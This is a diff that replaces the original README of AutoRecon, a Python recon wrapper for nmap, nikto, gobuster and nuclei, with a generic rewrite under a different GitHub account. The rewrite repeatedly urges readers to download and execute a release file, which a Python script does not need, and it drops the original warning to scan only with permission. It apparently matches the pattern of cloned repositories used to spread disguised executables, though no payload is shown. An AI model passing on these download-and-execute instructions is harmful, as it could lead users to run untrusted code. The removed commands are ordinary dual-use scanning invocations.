@@ -1,149 +1,116 @@
-# 🔎AutoRecon
+# AutoRecon: Automated Server and Domain Reconnaissance Utility 🕵️‍♂️
 
-**AutoRecon** is an automated server and domain reconnaissance utility designed for penetration testers and security specialists. The script launches popular reconnaissance tools, collects the results, and displays them in a user-friendly HTML report with dynamic updates directly in your browser.
+![GitHub release](https://img.shields.io/github/release/Codesignseo/AutoRecon.svg)
 
----
+Welcome to **AutoRecon**! This utility simplifies the process of server and domain reconnaissance for penetration testers and security specialists. It combines popular reconnaissance tools into one script, collects results, and presents them in a user-friendly HTML report that updates dynamically in your browser.
 
-## 📕Features
+## Table of Contents
 
-- **Automated execution of multiple scanners and utilities**
-- **Dynamic HTML report updates** — results appear as commands execute, no page refresh needed
-- **Automatic launch of a local HTTP server and opening the report in the browser**
-- **Cross-platform compatibility** — works on Windows and Linux (given the necessary utilities are installed)
-- **Convenient result storage structure** — everything is saved into folders for each target
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Tools](#supported-tools)
+- [Report Generation](#report-generation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
----
+## Features
 
-## 🛠️Tools Used
+- **Automated Reconnaissance**: Run multiple tools with a single command.
+- **Dynamic HTML Report**: View results in real-time within your browser.
+- **User-Friendly Interface**: Easy navigation and clear presentation of data.
+- **Comprehensive Toolset**: Integrates widely-used reconnaissance tools.
+- **Customizable**: Adjust settings to fit your specific needs.
 
-AutoRecon runs the following tools (if they are installed and available in your PATH):
+## Getting Started
 
-| Tool           | Purpose                                           |
-|----------------|---------------------------------------------------|
-| **nmap** | Port and service scanning                         |
-| **whatweb** | Web technology identification                     |
-| **whois** | Whois information for domains                     |
-| **amass** | Subdomain enumeration                             |
-| **theHarvester**| Gathering emails, names, domains from public sources|
-| **dnsrecon** | DNS reconnaissance                                |
-| **sslscan** | SSL/TLS analysis                                  |
-| **curl -I** | Retrieving HTTP headers                           |
-| **nikto** | Web server vulnerability scanning                 |
-| **gobuster** | Brute-forcing directories and files on a web server|
-| **nuclei** | Fast vulnerability scanning using templates       |
-| **subfinder** | Fast subdomain enumeration                        |
+To get started with AutoRecon, you can download the latest release from our [Releases page](https://github.com/Codesignseo/AutoRecon/releases). Download the appropriate file, execute it, and follow the instructions below to set it up on your system.
 
-> **Note:** If a tool is not installed, the report will show `[ERROR] Command not found: ...`
+## Installation
 
----
+### Prerequisites
 
-## 📨How Dynamic Updates Work
+Before installing AutoRecon, ensure you have the following tools installed:
 
-- After the script starts, a local HTTP server automatically launches (by default on port 8765).
-- The HTML report (`report.html`) opens in your browser and automatically fetches fresh results from `results.json` every 2 seconds.
-- As soon as a scanner finishes, its output immediately appears in the report — the page updates **without reloading**.
+- Python 3.x
+- pip (Python package installer)
 
----
+### Step-by-Step Installation
 
-## ✅Installation and Running
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Codesignseo/AutoRecon.git
+   cd AutoRecon
+   ```
 
-1.  **Install necessary tools**
-    Ensure the required utilities (listed above) are installed and available in your PATH variable.
+2. **Install Required Packages**:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-2.  **Clone the repository**
-    ```sh
-    git clone https://github.com/hiitaro/AutoRecon.git
-    cd AutoRecon
-    ```
-3.  **📦 Requirements**
-    ```sh
-    pip install -r requirements.txt
-    ```
-    
-4.  **Run the script**
-    ```sh
-    python autorecon.py <target>
-    ```
-    where `<target>` is an IP address or domain name.
+3. **Download the Latest Release**:
+   Visit our [Releases page](https://github.com/Codesignseo/AutoRecon/releases) to download the latest version. Execute the downloaded file to complete the installation.
 
-5.  **A browser will open with the report**
-    If it doesn't open automatically, navigate to:
-    [http://localhost:8765/report.html](http://localhost:8765/report.html)
+## Usage
 
----
+To run AutoRecon, use the following command in your terminal:
 
-## 💻️Example Usage
-
-![Interface Example](docs/screenshot.png)
-
----
-
-## ✏️Configuring Command Flags
-
-You can easily customize the flags and parameters for each tool by editing the `flags.json` file in the project root.  
-Only the tools listed in `flags.json` will be executed. If you remove a tool from the file, it will not run.
-
-**Example `flags.json`:**
-```json
-{
-    "Nmap Scan": "-sC -sV",
-    "HTTP Headers": "-I",
-    "WhatWeb": "",
-    "Whois Info": "",
-    "Amass Enum": "enum -d",
-    "theHarvester": "-d {target} -b all",
-    "DNSRecon": "-d",
-    "SSLScan": "",
-    "Nikto Scan": "-h",
-    "Gobuster Scan": "dir -u {url} -w /usr/share/wordlists/dirb/common.txt",
-    "Nuclei Scan": "-u {url} -silent",
-    "Subfinder": "-d"
-}
+```bash
+python autorecon.py <target_domain_or_ip>
 ```
 
-- Use `{target}` and `{url}` as placeholders; they will be replaced automatically.
-- To disable a tool, simply remove its entry from `flags.json`.
-- Changes take effect on the next script run.
+Replace `<target_domain_or_ip>` with the domain or IP address you want to analyze. AutoRecon will initiate the reconnaissance process, launching the integrated tools and generating the report.
 
-This makes it easy to tailor the scan to your needs without editing the main Python code.
+### Example Command
 
----
-
-## 📄Notes
-
--   **Stopping:** To stop the script and HTTP server, press `Ctrl+C` in the terminal.
--   **Cross-Platform:** The script works on Windows and Linux, but the set of available utilities may differ.
--   **Security:** Only use this on your own resources or with explicit permission from the owner!
-
----
-
-## 🔧️Extending
-
-You can easily add your own commands or tools — just append them to the `commands` dictionary in the `autorecon.py` file:
-
-```python
-commands = {
-    "Nmap Scan": f"nmap -sC -sV {target}",
-    "HTTP Headers": f"curl -I {'https' if protocol == 'https' else 'http'}://{target}",
-    "WhatWeb": f"whatweb {'https' if protocol == 'https' else 'http'}://{target}",
-    "Whois Info": f"whois {target}",
-    "Amass Enum": f"amass enum -d {target}",
-    "theHarvester": f"theHarvester -d {target} -b all",
-    "DNSRecon": f"dnsrecon -d {target}",
-    "SSLScan": f"sslscan {target}",
-    "Nikto Scan": f"nikto -h https://{target}" if protocol == "https" else f"nikto -h http://{target}",
-    "Gobuster Scan": f"gobuster dir -u {'https' if protocol == 'https' else 'http'}://{target} -w /usr/share/wordlists/dirb/common.txt",
-    "Nuclei Scan": f"nuclei -u {'https' if protocol == 'https' else 'http'}://{target} -silent",
-    "Subfinder": f"subfinder -d {target}"
-    }
+```bash
+python autorecon.py example.com
 ```
 
----
+## Supported Tools
 
-**AutoRecon** - your quick start for server reconnaissance and auditing!
+AutoRecon integrates the following tools for comprehensive reconnaissance:
 
+- **Nmap**: Network scanning tool to discover hosts and services.
+- **Nikto**: Web server scanner that tests for vulnerabilities.
+- **Gobuster**: Directory and file brute-forcing tool.
+- **Subfinder**: Subdomain discovery tool.
+- **WhatWeb**: Web technology detection tool.
+- **Nuclei**: Fast and flexible vulnerability scanner.
 
+These tools work together to provide a thorough analysis of the target.
 
+## Report Generation
 
+Once the reconnaissance is complete, AutoRecon generates an HTML report. This report displays the results from all tools used, making it easy to review findings.
 
+### Accessing the Report
 
+After the script finishes running, open the generated HTML file in your browser. The report will automatically update as the tools finish their tasks.
+
+## Contributing
+
+We welcome contributions to AutoRecon! If you have suggestions, bug fixes, or new features, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request.
+
+Your contributions help improve AutoRecon for everyone.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or feedback, feel free to reach out:
+
+- **Email**: support@example.com
+- **GitHub**: [Codesignseo](https://github.com/Codesignseo)
+
+Thank you for using AutoRecon! Visit our [Releases page](https://github.com/Codesignseo/AutoRecon/releases) for the latest updates and tools.
